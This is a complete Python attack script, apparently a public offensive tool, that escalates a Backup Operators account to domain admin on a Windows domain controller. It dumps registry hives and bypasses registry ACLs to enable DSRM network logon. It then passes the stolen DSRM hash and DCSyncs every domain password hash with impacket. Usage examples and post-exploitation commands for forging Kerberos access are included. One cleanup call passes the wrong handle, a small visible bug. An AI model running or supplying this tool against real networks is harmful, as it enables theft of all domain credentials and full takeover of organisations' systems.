#!/usr/bin/env python3
"""
BackupOperatorsDump v3.0 - Full Backup Operators → Domain Admin chain.

Exploits both SeBackupPrivilege (read) and SeRestorePrivilege (write) to
achieve full domain compromise without requiring admin credentials.

Attack chain:
  1. RegSaveKey SAM + SYSTEM → extract DSRM Administrator hash
  2. REG_OPTION_BACKUP_RESTORE write → set DsrmAdminLogonBehavior=2
  3. Pass-the-Hash with DSRM hash (local admin on DC via network)
  4. RegSaveKey SECURITY → extract $MACHINE.ACC (DC machine account)
  5. DCSync with $MACHINE.ACC → dump all domain hashes
  6. Cleanup → remove DsrmAdminLogonBehavior registry value

Key technical details:
  - REG_OPTION_BACKUP_RESTORE (0x00000004) bypasses DACL checks when the
    caller has SeRestorePrivilege (Backup Operators have this by default)
  - DSRM PtH requires domain=DC_HOSTNAME (not empty, not FQDN)
  - SAM Administrator on a DC is the DSRM password, NOT domain admin
  - $MACHINE.ACC has DCSync rights by default on every DC

Requirements:
    - User must be a member of the Backup Operators group
    - Remote Registry service reachable (TCP/445, winreg named pipe)
    - Target must be a Domain Controller

Author: github.com/TazeguID
License: MIT
"""

import argparse
import sys
import os
import io
import re
import uuid
import time
import struct
import subprocess
from contextlib import redirect_stdout

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import rrp, transport
    from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
except ImportError:
    print("[!] impacket is required: pip install impacket")
    sys.exit(1)

REG_OPTION_BACKUP_RESTORE = 0x00000004
KEY_SET_VALUE = 0x0002
KEY_QUERY_VALUE = 0x0001
REG_DWORD = 4


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


def info(msg):
    print(f"  {Colors.BLUE}[*]{Colors.END} {msg}")

def success(msg):
    print(f"  {Colors.GREEN}[+]{Colors.END} {msg}")

def warn(msg):
    print(f"  {Colors.YELLOW}[!]{Colors.END} {msg}")

def error(msg):
    print(f"  {Colors.RED}[-]{Colors.END} {msg}")

def phase(num, msg):
    print(f"\n  {Colors.CYAN}{Colors.BOLD}{'─' * 55}{Colors.END}")
    print(f"  {Colors.CYAN}{Colors.BOLD}  Phase {num}: {msg}{Colors.END}")
    print(f"  {Colors.CYAN}{Colors.BOLD}{'─' * 55}{Colors.END}\n")


def banner():
    print(f"""
{Colors.BOLD}╔═══════════════════════════════════════════════════════════╗
║              BackupOperatorsDump  v3.0                    ║
║  Full chain: Backup Operators → DSRM → PtH → DCSync     ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}
""")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Backup Operators → Domain Admin via DSRM PtH + $MACHINE.ACC DCSync",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
attack chain:
  1. RegSaveKey SAM+SYSTEM     → DSRM hash
  2. REG_OPTION_BACKUP_RESTORE → DsrmAdminLogonBehavior=2
  3. DSRM PtH                  → local admin on DC
  4. RegSaveKey SECURITY       → $MACHINE.ACC hash
  5. DCSync                    → all domain hashes
  6. Cleanup                   → restore registry

examples:
  %(prog)s -t 192.168.1.200 -u svc_backup -p 'Password1!' -d corp.local
  %(prog)s -t 192.168.1.200 -u svc_backup -H :aabbccdd11223344 -d corp.local
  %(prog)s -t 192.168.1.200 -u svc_backup -p 'Pass!' -d corp.local -o /tmp/loot
  %(prog)s -t 192.168.1.200 -u svc_backup -p 'Pass!' -d corp.local --reg-only
        """,
    )
    parser.add_argument("-t", "--target", required=True, help="DC IP address")
    parser.add_argument("-u", "--username", required=True, help="Backup Operators member")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hashes", default="", help="NTLM hash (LM:NT or :NT)")
    parser.add_argument("-d", "--domain", default="", help="Domain name")
    parser.add_argument("-o", "--output", default=".", help="Output directory (default: cwd)")
    parser.add_argument("--dc-hostname", default="",
                        help="DC NetBIOS hostname (auto-detected if not set)")
    parser.add_argument("--reg-only", action="store_true",
                        help="Only dump registry (no DSRM PtH chain)")
    parser.add_argument("--no-cleanup", action="store_true",
                        help="Don't restore DsrmAdminLogonBehavior after exploit")
    parser.add_argument("--remote-path", default="C:\\Users\\Public",
                        help="Remote temp directory (default: C:\\Users\\Public)")
    return parser.parse_args()


def smb_connect(target, username, password, domain, lmhash, nthash):
    info(f"Connecting to {target}...")
    conn = SMBConnection(target, target, timeout=10)
    conn.login(username, password, domain, lmhash, nthash)
    success(f"Authenticated as {domain}\\{username}")
    return conn


def open_winreg(smb_conn, target):
    rpc = transport.SMBTransport(target, 445, r"\winreg", smb_connection=smb_conn)
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)
    return dce


def save_and_download(dce, root, hive, remote_path, smb_conn, local_path):
    suffix = uuid.uuid4().hex[:8]
    remote_file = f"{remote_path}\\{suffix}.hiv"
    smb_path = remote_file.replace("C:\\", "").replace("\\", "/")

    ans = rrp.hBaseRegOpenKey(dce, root, hive)
    key = ans["phkResult"]
    rrp.hBaseRegSaveKey(dce, key, remote_file)

    with open(local_path, "wb") as f:
        smb_conn.getFile("C$", smb_path, f.write)
    smb_conn.deleteFile("C$", smb_path)

    size = os.path.getsize(local_path)
    success(f"HKLM\\{hive} → {local_path} ({size:,} bytes)")
    return local_path


def extract_dsrm_hash(system_path, sam_path):
    local_ops = LocalOperations(system_path)
    boot_key = local_ops.getBootKey()

    buf = io.StringIO()
    sam = SAMHashes(sam_path, boot_key, isRemote=False)
    with redirect_stdout(buf):
        sam.dump()
    sam.finish()

    for line in buf.getvalue().split('\n'):
        if line.startswith('Administrator:500:'):
            nt_hash = line.split(':')[3]
            return boot_key, nt_hash
    return boot_key, None


def extract_machine_hash(security_path, boot_key):
    buf = io.StringIO()
    lsa = LSASecrets(security_path, boot_key, None, isRemote=False)
    with redirect_stdout(buf):
        lsa.dumpSecrets()
    lsa.finish()

    for line in buf.getvalue().split('\n'):
        if 'MACHINE.ACC' in line.upper():
            m = re.search(r'aad3b435b51404eeaad3b435b51404ee:([a-f0-9]{32})', line)
            if m:
                return m.group(1)
    return None


def main():
    banner()
    args = parse_args()

    lmhash, nthash = "", ""
    if args.hashes:
        parts = args.hashes.split(":")
        lmhash, nthash = ("", parts[0]) if len(parts) == 1 else (parts[0], parts[1])

    os.makedirs(args.output, exist_ok=True)
    dsrm_written = False

    try:
        # ─── Phase 1: SAM + SYSTEM dump ──────────────────────
        phase(1, "Registry Hive Extraction (SAM + SYSTEM)")

        conn = smb_connect(args.target, args.username, args.password,
                           args.domain, lmhash, nthash)

        dc_hostname = args.dc_hostname or conn.getServerName()
        info(f"DC hostname: {dc_hostname}")

        dce = open_winreg(conn, args.target)
        ans = rrp.hOpenLocalMachine(dce)
        root = ans["phKey"]

        system_path = save_and_download(
            dce, root, "SYSTEM", args.remote_path, conn,
            os.path.join(args.output, "SYSTEM.hiv"))
        sam_path = save_and_download(
            dce, root, "SAM", args.remote_path, conn,
            os.path.join(args.output, "SAM.hiv"))

        boot_key, dsrm_hash = extract_dsrm_hash(system_path, sam_path)
        if not dsrm_hash:
            error("Could not extract DSRM hash from SAM")
            sys.exit(1)

        success(f"DSRM Administrator hash: {dsrm_hash}")
        warn("This is the DSRM password, NOT the domain Administrator")

        if args.reg_only:
            info("--reg-only specified, stopping after registry dump")
            print(f"\n  DSRM hash: {dsrm_hash}")
            print(f"  Hive files: {args.output}/")
            dce.disconnect()
            conn.close()
            return

        # ─── Phase 2: Write DsrmAdminLogonBehavior = 2 ───────
        phase(2, "DSRM Unlock (SeRestorePrivilege → REG_OPTION_BACKUP_RESTORE)")

        info("Opening HKLM\\..\\Lsa with BACKUP_RESTORE write intent...")
        ans = rrp.hBaseRegOpenKey(
            dce, root,
            'SYSTEM\\CurrentControlSet\\Control\\Lsa',
            dwOptions=REG_OPTION_BACKUP_RESTORE,
            samDesired=KEY_SET_VALUE | KEY_QUERY_VALUE
        )
        lsa_key = ans["phkResult"]
        success("DACL bypass successful (SeRestorePrivilege)")

        # Check if value already exists
        original_val = None
        try:
            qans = rrp.hBaseRegQueryValue(dce, lsa_key, 'DsrmAdminLogonBehavior')
            original_val = struct.unpack('<L', qans[1][:4])[0]
            info(f"Current DsrmAdminLogonBehavior = {original_val}")
        except Exception:
            info("DsrmAdminLogonBehavior does not exist (will create)")

        rrp.hBaseRegSetValue(dce, lsa_key, 'DsrmAdminLogonBehavior', REG_DWORD, 2)
        dsrm_written = True
        success("DsrmAdminLogonBehavior = 2 → DSRM network logon ENABLED")

        dce.disconnect()
        conn.close()

        info("Waiting 3s for LSA policy refresh...")
        time.sleep(3)

        # ─── Phase 3: PtH with DSRM hash → SECURITY ─────────
        phase(3, f"DSRM Pass-the-Hash (domain={dc_hostname})")

        info(f"Authenticating as {dc_hostname}\\Administrator with DSRM hash...")
        conn2 = SMBConnection(args.target, args.target, timeout=10)
        conn2.login('Administrator', '', dc_hostname, '', dsrm_hash)
        success("LOCAL ADMIN via DSRM PtH!")

        dce2 = open_winreg(conn2, args.target)
        ans = rrp.hOpenLocalMachine(dce2)
        root2 = ans["phKey"]

        security_path = save_and_download(
            dce2, root2, "SECURITY", args.remote_path, conn2,
            os.path.join(args.output, "SECURITY.hiv"))

        dce2.disconnect()
        conn2.close()

        # ─── Phase 4: Cleanup registry ───────────────────────
        phase(4, "Cleanup (restore DsrmAdminLogonBehavior)")

        if not args.no_cleanup:
            conn3 = smb_connect(args.target, args.username, args.password,
                                args.domain, lmhash, nthash)
            dce3 = open_winreg(conn3, args.target)
            ans = rrp.hOpenLocalMachine(dce3)
            r3 = ans["phKey"]
            ans = rrp.hBaseRegOpenKey(
                dce3, r3, 'SYSTEM\\CurrentControlSet\\Control\\Lsa',
                dwOptions=REG_OPTION_BACKUP_RESTORE,
                samDesired=KEY_SET_VALUE
            )
            lk = ans["phkResult"]

            if original_val is not None:
                rrp.hBaseRegSetValue(lk, lk, 'DsrmAdminLogonBehavior',
                                     REG_DWORD, original_val)
                success(f"Restored DsrmAdminLogonBehavior = {original_val}")
            else:
                try:
                    rrp.hBaseRegDeleteValue(dce3, lk, 'DsrmAdminLogonBehavior')
                    success("DsrmAdminLogonBehavior DELETED (didn't exist before)")
                except Exception:
                    rrp.hBaseRegSetValue(dce3, lk, 'DsrmAdminLogonBehavior',
                                         REG_DWORD, 0)
                    success("DsrmAdminLogonBehavior set to 0")

            dsrm_written = False
            dce3.disconnect()
            conn3.close()
        else:
            warn("Skipping cleanup (--no-cleanup). DsrmAdminLogonBehavior=2 LEFT IN PLACE!")

        # ─── Phase 5: Extract $MACHINE.ACC ────────────────────
        phase(5, "Extract $MACHINE.ACC from SECURITY hive")

        machine_hash = extract_machine_hash(security_path, boot_key)
        if not machine_hash:
            error("Could not extract $MACHINE.ACC")
            info("Manual LSA dump:")
            lsa = LSASecrets(security_path, boot_key, None, isRemote=False)
            try:
                lsa.dumpSecrets()
            except Exception:
                pass
            lsa.finish()
            return

        success(f"$MACHINE.ACC ({dc_hostname}$) NT hash: {machine_hash}")
        success("DC machine account has DCSync rights by default!")

        # ─── Phase 6: DCSync ──────────────────────────────────
        phase(6, "DCSync via $MACHINE.ACC")

        dcsync_out = os.path.join(args.output, "dcsync_full.txt")
        info(f"impacket-secretsdump → {dcsync_out}")

        result = subprocess.run([
            "impacket-secretsdump",
            "-hashes", f"aad3b435b51404eeaad3b435b51404ee:{machine_hash}",
            f"{args.domain}/{dc_hostname}$@{args.target}",
            "-just-dc-ntlm",
        ], capture_output=True, text=True, timeout=120)

        with open(dcsync_out, "w") as f:
            f.write(result.stdout)

        count = 0
        for line in result.stdout.split('\n'):
            if ':::' in line and not line.startswith('['):
                count += 1
                if count <= 10:
                    print(f"  {line.strip()}")
        if count > 10:
            print(f"  ... +{count - 10} more")

        print()
        success(f"DCSync COMPLETE: {count} domain hashes extracted")
        success(f"Full output: {dcsync_out}")

        # ─── Summary ──────────────────────────────────────────
        print(f"\n  {Colors.BOLD}{'═' * 55}{Colors.END}")
        print(f"  {Colors.GREEN}{Colors.BOLD}  CHAIN COMPLETE: Backup Operators → Domain Admin{Colors.END}")
        print(f"  {Colors.BOLD}{'═' * 55}{Colors.END}")
        print(f"""
    Files:
      {args.output}/SYSTEM.hiv
      {args.output}/SAM.hiv
      {args.output}/SECURITY.hiv
      {args.output}/dcsync_full.txt

    Key hashes:
      DSRM Admin:     {dsrm_hash}
      $MACHINE.ACC:   {machine_hash}

    Post-exploitation:
      impacket-getTGT '{args.domain}/Administrator' \\
        -hashes :<admin_hash_from_dcsync> -dc-ip {args.target}
      export KRB5CCNAME=Administrator.ccache
      impacket-secretsdump -k -no-pass \\
        '{args.domain}/Administrator@<DC_FQDN>' -dc-ip {args.target}
""")

    except KeyboardInterrupt:
        warn("Interrupted")
    except Exception as e:
        error(f"Fatal: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if dsrm_written and not args.no_cleanup:
            warn("DsrmAdminLogonBehavior may still be set to 2!")
            warn("Manual cleanup: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /f")


if __name__ == "__main__":
    main()
